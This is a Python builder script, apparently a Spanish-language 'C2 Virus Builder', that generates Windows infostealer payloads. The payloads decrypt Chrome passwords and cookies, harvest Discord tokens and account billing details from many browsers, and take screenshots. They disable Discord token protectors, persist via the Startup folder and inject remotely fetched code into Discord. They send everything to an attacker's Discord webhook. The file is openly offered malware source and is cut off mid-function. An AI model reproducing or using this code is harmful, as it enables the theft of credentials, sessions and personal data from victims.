#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess,os,sys,threading
from base64 import b64encode, a85encode, b85encode

from urllib3 import connection_from_url

if sys.platform.startswith("win"):
    os.system("cls")
elif sys.platform.startswith("linux"):
    os.system("clear")
else:
    print("[+] Sistema operativo Desconocido, Saliendo.")
    exit()
version = '# V1.0'
try:
    from colorama import *
    import shutil
    import requests
    from time import sleep
except:
    def a(variable):
        a = open(os.devnull,'w')
        p = subprocess.call(['pip','install','{}'.format(variable)],stdout=a,stderr=subprocess.STDOUT)
        if p == 0:
            pass
        else:
            pass
    a('requests')
    a('shutil')
    a('time')
    a('colorama')
    try:
        from colorama import *
        import requests
        import shutil
        from time import sleep
    except ImportError as e:
        print("[+] Modulos Faltantes {}".format(e))
        exit()

fo = Fore
def hwid():
    import time
    try:
        hwid = subprocess.check_output('wmic csproduct get UUID').decode().split('\n')[1].strip()
        rekes = requests.get('https://pastebin.com/raw/Hc9W90Ld')

        try:
            if hwid in rekes.text:
                chars = ['|', '/', '-', '\\', '|', '/', '-', '\\' ] 
                for char in chars:
                    sys.stdout.write('\r'+'[+] '+'Subscripcion encontrada =) ['+char + ']')
                    time.sleep(0.9)
                    sys.stdout.flush()

            else:
                print(f"HWID: {hwid}")
                print(f"{Fore.GREEN}No eres suscriptor de esta funcion!")
                print(f"{Fore.GREEN}Contacta mediante ticket en | https://discord.gg/AHR84u767J | para comprar una.{Fore.WHITE}")
                exit()
        except:
            print(f"{Fore.RED} Saliendo . . .")
            exit()
    except:
        print(f"{Fore.RED} Saliendo . . .")
        exit()
def keybp():
    try:
        pa = input(f"\n{fo.GREEN}[+] {fo.WHITE}Deseas Salir de la Script? s/n >>: ")
        if pa.lower() == str("s"):
            print("\n")
            exit()
        elif pa.lower() == str("n"):
            print("\n")
            main()
        else:
            print(f"{fo.GREEN}[+] {fo.WHITE}Opción no reconocida, porfavor solo responde con s/n !!! \n")
            main()
    except KeyboardInterrupt:
        exit()

def webh():
    try:
        global webhook
        webhook = input(f"\n{fo.GREEN}[+] {fo.WHITE}Introduce tu Discord Webhook >>: ")
        if webhook == "":
            main()
        else:
            print(f"\n{fo.GREEN}[+] {fo.WHITE}Tu webhook seleccionada es {webhook}")
    except KeyboardInterrupt:
        keybp()
def update():
    try:
        try:
            act = requests.get('https://pastebin.com/raw/FnpxrpMn')
        except ConnectionAbortedError:
            print(f"{fo.GREEN}[+] {fo.WHITE}Data Base Caida, Prueba mas tarde o contacta a soporte.!")
        except ConnectionError:
            print(f"{fo.GREEN}[+] {fo.WHITE}Data Base Caida, Prueba mas tarde o contacta a soporte.!")
        except ConnectionRefusedError:
            print(f"{fo.GREEN}[+] {fo.WHITE}Data Base Caida, Prueba mas tarde o contacta a soporte.!")
        except ConnectionResetError:
            print(f"{fo.GREEN}[+] {fo.WHITE}Data Base Caida, Prueba mas tarde o contacta a soporte.!")
        except connection_from_url:
            print(f"{fo.GREEN}[+] {fo.WHITE}Data Base Caida, Prueba mas tarde o contacta a soporte.!")
        actp = act.text
        if version in actp:
            print(f"\n{fo.GREEN}[+] {fo.WHITE}Felicidades, Estás Usando La Ultima versión!!!")
            sleep(6)
        elif version not in actp:
            try:
                questio = input(f"{fo.GREEN}[+] {fo.WHITE}Descargar nueva update? s/n >>: ")
                if questio.lower() == str("s"):
                    pass
                else:
                    main()
                print(f"\n{fo.GREEN}[+] {fo.WHITE}Descargando La Ultima versión... ")
                archivo = os.path.basename(__file__)
                with open(archivo,'w+') as f:
                    try:
                        f.write(actp)
                        print(f"\n{fo.GREEN}[+] {fo.WHITE}Actualización Terminada :), Porfavor Reinicia el programa para que surta efecto !!")
                        sleep(4)
                        exit()
                    except KeyboardInterrupt:
                        keybp()
            except KeyboardInterrupt:
                keybp()
        else:
            pass
    except KeyboardInterrupt:
        keybp()
def checkupdate():
    try:
        try:
            act = requests.get('https://pastebin.com/raw/FnpxrpMn')
        except ConnectionAbortedError:
            print(f"{fo.GREEN}[+] {fo.WHITE}Data Base Caida, Prueba mas tarde o contacta a soporte.!")
        except ConnectionError:
            print(f"{fo.GREEN}[+] {fo.WHITE}Data Base Caida, Prueba mas tarde o contacta a soporte.!")
        except ConnectionRefusedError:
            print(f"{fo.GREEN}[+] {fo.WHITE}Data Base Caida, Prueba mas tarde o contacta a soporte.!")
        except ConnectionResetError:
            print(f"{fo.GREEN}[+] {fo.WHITE}Data Base Caida, Prueba mas tarde o contacta a soporte.!")
        actp = act.text
        if version not in actp:
            print(f"\n{fo.GREEN}[+] {fo.WHITE}Hay una nueva update disponible, Descargala escribiendo upt y dando enter!!!")
            sleep(1)
        else:
            print(f"\n{fo.GREEN}[+] {fo.WHITE}Felicidades, Estás Usando La Ultima versión!!!")
    except KeyboardInterrupt:
        keybp()
def main():
    try:
        while True:
            try:
                if sys.platform.startswith("linux"):
                    os.system("clear")
                else:
                    os.system("cls")
                checkupdate()
                sleep(2)
                if sys.platform.startswith("linux"):
                    os.system("clear")
                else:
                    os.system("cls")
                print(f"""{fo.RED}                                                                     
   (        )                                         (                (     (                  
   )\    ( /(     (   (    (    (       (           ( )\     (    (    )\    )\ )     (    (    
 (((_)   )(_))    )\  )\   )\   )(     ))\   (      )((_)   ))\   )\  ((_)  (()/(    ))\   )(   
 )\___  ((_)     ((_)((_) ((_) (()\   /((_)  )\    ((_)_   /((_) ((_)  _     ((_))  /((_) (()\  
((/ __| |_  )    \ \ / /   (_)  ((_) (_))(  ((_)    | _ ) (_))(   (_) | |    _| |  (_))    ((_) 
 | (__   / /      \ V /    | | | '_| | || | (_-<    | _ \ | || |  | | | |  / _` |  / -_)  | '_| 
  \___| /___|      \_/     |_| |_|    \_,_| /__/    |___/  \_,_|  |_| |_|  \__,_|  \___|  |_|   
                                                          {fo.GREEN}Dev: {fo.MAGENTA}suleymansha#8496 {fo.YELLOW}/ {fo.MAGENTA}Portu#0022 {fo.RED}V1.0                                        
                    """)
                print(f"""{Fore.GREEN}
|==================================================|
| {fo.GREEN}Free Menu {fo.WHITE}= {fo.WHITE}free                                 | 
| {fo.YELLOW}Premium Menu {fo.WHITE}= {fo.YELLOW}vip                               |
| {fo.LIGHTBLUE_EX}Troll Menu {fo.WHITE}= {fo.LIGHTRED_EX}troll                               |
| {fo.RED}Update Menu {fo.WHITE}= {fo.MAGENTA}upt                                |
|==================================================|
                """)
                print(fo.WHITE)
                preg = input(f"{fo.GREEN}[+] {fo.WHITE}Menu Keyword (free) {fo.YELLOW}>{fo.RED}>{fo.MAGENTA}:{fo.WHITE} ")
                if preg.lower() == str("free"):
                    try:
                        print(f"""{Fore.GREEN}
|==================================================|
| {fo.GREEN}DualMTS.py {fo.WHITE}Gen No FUD = {fo.GREEN}freev1                   |
|==================================================|
                        """)
                        free = input(f"{fo.GREEN}[+] {fo.WHITE}GEN Keyword (freev1) {fo.YELLOW}>{fo.RED}>{fo.MAGENTA}:{fo.WHITE} ")
                        print()
                        if free.lower() == str("freev1"):
                            try:
                                webh()
                                archivo = open('DualMTS.py', 'w+')
                                archivo.write(r"""
# DualMTS.py FREE VERSION (NO FUD) Gen by C2 Virus Builder, Dev suleymansha#8496 | Portu#0022
import requests
import os 
import win32crypt 
import shutil 
import sqlite3 
import zipfile 
import json 
import base64 
import psutil 
import pyautogui

from re import findall
from datetime import datetime
from Crypto.Cipher import AES

#

import os, subprocess, winreg, ctypes
from requests import get
from getpass import getuser
from socket import gethostname
from platform import uname
from uuid import getnode
from json import dumps, loads
from sqlite3 import connect
from wmi import WMI
from base64 import b64decode
from win32crypt import CryptUnprotectData
from tempfile import gettempdir
from re import split, findall
from shutil import disk_usage, copy2
from psutil import cpu_count, virtual_memory
from Crypto.Cipher import AES
from urllib.request import Request, urlopen
from discord import Webhook, RequestsWebhookAdapter
from discord_webhook import DiscordWebhook, DiscordEmbed
from subprocess import Popen, PIPE

##

import re, os
if os.name != "nt":
    exit()
from re import findall
import json
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
import sys

##


class dualmts:
    def __init__(self):
        self.webhook = ""
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\DualMTS"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except:
            pass

        self.tokens = []
        self.saved = []

        if os.path.exists(os.getenv("appdata")+"\\BetterDiscord"):
            self.bypass_better_discord()

        if not os.path.exists(self.appdata+'\\Google'):
            self.files += f"**{os.getlogin()}** No tiene Google instalado\n"
        else:
            self.grabPassword()
            self.grabCookies()
        self.grabTokens()
        self.screenshot()
        self.SendInfo()
        try:
            shutil.rmtree(self.tempfolder)
        except (PermissionError, FileExistsError):
            pass

    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers


    def bypass_better_discord(self):
        bd = os.getenv("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"
        with open(bd, "rt", encoding="cp437") as f:
            content = f.read()
            content2 = content.replace("api/webhooks", "Kisses")
        with open(bd, 'w'): pass
        with open(bd, "wt", encoding="cp437") as f:
            f.write(content2)


    def get_master_key(self):
        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)
    
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
    
    def grabPassword(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
        f.write("Kuray STEALED PASSWORDS\n\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)
                if url != "":
                    f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        except:
            pass
        f.close()
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass  


    def grabCookies(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
        f.write("KURAY STALED COOKIES\n\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                Host = r[0]
                user = r[1]
                encrypted_cookie = r[2]
                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
                if Host != "":
                    f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
        except:
            pass
        f.close()
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass


    def grabTokens(self):
        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
        f.write("KURAY STEALED TOKENS\n\n")
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            self.tokens.append(token)
        for token in self.tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
            if r.status_code == 200:
                if token in self.saved:
                    continue
                self.saved.append(token)
                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
                badges = ""
                flags = j['flags']
                if (flags == 1):
                    badges += "Staff, "
                if (flags == 2):
                    badges += "Partner, "
                if (flags == 4):
                    badges += "Hypesquad Event, "
                if (flags == 8):
                    badges += "Green Bughunter, "
                if (flags == 64):
                    badges += "Hypesquad Bravery, "
                if (flags == 128):
                    badges += "HypeSquad Brillance, "
                if (flags == 256):
                    badges += "HypeSquad Balance, "
                if (flags == 512):
                    badges += "Early Supporter, "
                if (flags == 16384):
                    badges += "Gold BugHunter, "
                if (flags == 131072):
                    badges += "Verified Bot Developer, "
                if (badges == ""):
                    badges = "None"

                connections = (requests.get("https://discordapp.com/api/v9/users/@me/connections", headers=self.getheaders(token)).text).replace("[", "").replace("]", "").replace("{", "").replace("}", "").replace('"', "").replace(",", " /")
                if not connections:
                       connections = "There are no linked accounts"
                user = j["username"] + "#" + str(j["discriminator"])
                email = j["email"]
                phone = j["phone"] if j["phone"] else "No Phone Number attached"
                creation_date = datetime.fromtimestamp(((int(j["id"]) >> 22) + 1420070400000) / 1000).strftime("%d-%m-%Y %H:%M:%S")

                url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
                try:
                    requests.get(url)
                except:
                    url = url[:-4]

                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
                has_nitro = False
                has_nitro = bool(len(nitro_data) > 0)

                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                
                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n Connections: \n{connections}\n Acc date: {creation_date}")
        f.close()

    def screenshot(self):
        image = pyautogui.screenshot()
        image.save(self.tempfolder + "\\Screenshot.png")

    def SendInfo(self):
        try:
            data = requests.get("http://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        except:
            pass

        temp = os.path.join(self.tempfolder)
        new = os.path.join(self.appdata, f'Infectado: [{os.getlogin()}].zip')
        self.zip(temp, new)
        for dirname, _, files in os.walk(self.tempfolder):
            for f in files:
                self.files += f"\n{f}"
        n = 0
        for r, d, files in os.walk(self.tempfolder):
            n+= len(files)
            self.fileCount = f"Archivos robados:\n "

        for token in self.tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
            if r.status_code == 200:
                if token in self.saved:
                    continue
                self.saved.append(token)
       
        embed = {
            "avatar_url":"https://media.discordapp.net/attachments/914647494019919872/918977906787618866/kuray2.png",
            "embeds": [
                {
                    "author": {
                        "name": "Dual Mitsec Vacunando!",
                        "url": "https://ilovesisters.xyz/",
                        "icon_url": "https://media.discordapp.net/attachments/914647494019919872/918977906787618866/kuray2.png"
                    },
                    "description": f"**Dual Mitsec** \n```\nComputerName: {os.getenv('COMPUTERNAME')}\n\nIP: {ip} | City: {city}\nRegion: {region}  | Country: {country}\n\n```[G Maps]({googlemap})```\n\n{self.fileCount}{self.files}```",
                    "color": 000000,

                    "thumbnail": {
                      "url": "https://media.discordapp.net/attachments/914647494019919872/918977906787618866/kuray2.png"
                    },
                     
                    "footer": {
                      "text": "Code by Suleymansha & Portu"
                    }
                    
                }
            ]
        }
        requests.post(self.webhook, json=embed)
        requests.post(self.webhook, files={'upload_file': open(new,'rb')})


    def zip(self, src, dst):
        zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(src)
        for dirname, _, files in os.walk(src):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

if __name__ == "__main__":
    dualmts()
                        
                        """)
                                archivo.close()
                                with open('DualMTS.py' , 'r') as f:
                                    lines = f.readlines()
                                with open('DualMTS.py', 'w') as f2:
                                    for lin in lines:
                                        lin.rstrip()
                                        lin = lin.replace('self.webhook = ""',  f'self.webhook = "{webhook}" ')
                                        f2.write("".join(lin))
                                print(f"\n{fo.GREEN}[+] {fo.WHITE}DualMTS.py Generado , Guardado como DualMTS.py , Disfruta :) !!!!")
                                sleep(5)
                            except KeyboardInterrupt:
                                keybp()
                        else:
                            main()
                    except KeyboardInterrupt:
                        keybp()
                elif preg.lower() == str("vip"):
                    try:
                        print(f"""{Fore.RED}
|==================================================|
| {fo.RED}DualMTS_VIP.py FUD = vip1                        |
| {fo.GREEN}More {fo.MAGENTA}Comming {fo.RED}soon {fo.GREEN}!{fo.RED}                              |
|==================================================|
                        """)
                        vip = input(f"{fo.GREEN}[+] {fo.WHITE}GEN Keyword (vip1) {fo.YELLOW}>{fo.RED}>{fo.MAGENTA}:{fo.WHITE} ")
                        print()
                        if vip.lower() == str("vip1"):
                            try:
                                webh()
                                hwid()
                                ruta = os.getenv("temp")
                                ruta2 = os.path.dirname(os.path.abspath(__file__))
                                file_name = 'DualMTS_VIP.py'
                                completeName = os.path.join(ruta, file_name)
                                archivo = open(completeName, "w+", encoding="utf-8")
                                archivo.write(r"""
# DualMTS.py FREE VERSION (NO FUD) Gen by C2 Virus Builder, Dev suleymansha#8496 | Portu#0022
import os
import json
import httpx
import ctypes
import psutil
import asyncio
import sqlite3
import zipfile
import threading
import subprocess
import shutil

from sys import argv
from PIL import ImageGrab
from base64 import b64decode
from re import findall, match
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

from time import sleep
import win32console
import win32gui
import sys,os
ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana,0)
if sys.platform.startswith("win"):
    try:
        aeee = os.path.basename(__file__)
        aee = os.path.splitext(os.path.basename(__file__))[0]
        a = aee+".exe"
        os.system(f'copy /Y "{a}" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" ')
    except Exception as e:
        print(e)
elif sys.platform.startswith("linux"):
    pass
else:
  exit()

webhook = ""

config = webhook


class functions(object):
    @staticmethod
    def getHeaders(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def get_master_key(path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    @staticmethod
    def config(e: str) -> str or bool | None:
        return config.get(e)


class dualdev(functions):
    def __init__(self):
        self.webhook = self.config('webhook')
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.temp = os.getenv("temp")
        self.dir = self.temp+"\\DualMTS"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"

        try:
            os.mkdir(os.path.join(self.dir))
        except Exception:
            pass

        self.sep = os.sep
        self.tokens = []
        self.robloxcookies = []

    def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def checkToken(self, tkn: str) -> str:
        try:
            r = httpx.get(
                url=self.baseurl,
                headers=self.getHeaders(tkn),
                timeout=5.0
            )
        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
            pass
        if r.status_code == 200 and tkn not in self.tokens:
            self.tokens.append(tkn)

    async def init(self):
        await self.bypassBetterDiscord()
        await self.bypassTokenProtector()
        function_list = [self.screenshot, self.grabTokens,
                         self.grabRobloxCookie]
        if self.config('hide_self'):
            function_list.append(self.hide)



        if os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Default') and os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
            function_list.append(self.grabPassword)
            function_list.append(self.grabCookies)

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.neatifyTokens()
        self.finish()

    def LogOut(self):
         for proc in psutil.process_iter():
             if any(procstr in proc.name() for procstr in\
             ['discord','Discord', 'DiscordCanary', 'DiscordDevelopment', 'DiscordPTB']):
                 proc.kill()
         for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
             for name in dirs:
                 if "discord_desktop_core-" in name:
                     try:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core-3\\index.js")
                         os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Kuray"))
                     except FileNotFoundError:
                         pass
                     f = requests.get("https://raw.githubusercontent.com/afbv0129f9a999123/kakakasjfas/main/protection").text.replace("%WEBHOOK_LINK%", self.webhook)
                     with open(directory_list, 'w', encoding="utf-8") as index_file:
                         index_file.write(f)
         for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
             for name in files:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)

    async def bypassTokenProtector(self):
        # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        config = tp+"config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config) as f:
                item = json.load(f)
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write(
                    "\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")

    async def bypassBetterDiscord(self):
        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            x = "api/webhooks"
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'WithLoveDualMTS')
            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                f.write(content)

    def getProductValues(self):
        try:
            wkey = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        except Exception:
            wkey = "N/A (Likely Pirated)"
        try:
            productName = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
        except Exception:
            productName = "N/A"
        return [productName, wkey]

    @try_extract
    def grabTokens(self):
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if "discord" not in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                asyncio.run(self.checkToken(token))
            else:
                if os.path.exists(self.roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_val(b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
                                asyncio.run(self.checkToken(token))

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                asyncio.run(self.checkToken(token))

    @try_extract
    def grabPassword(self):
        master_key = self.get_master_key(
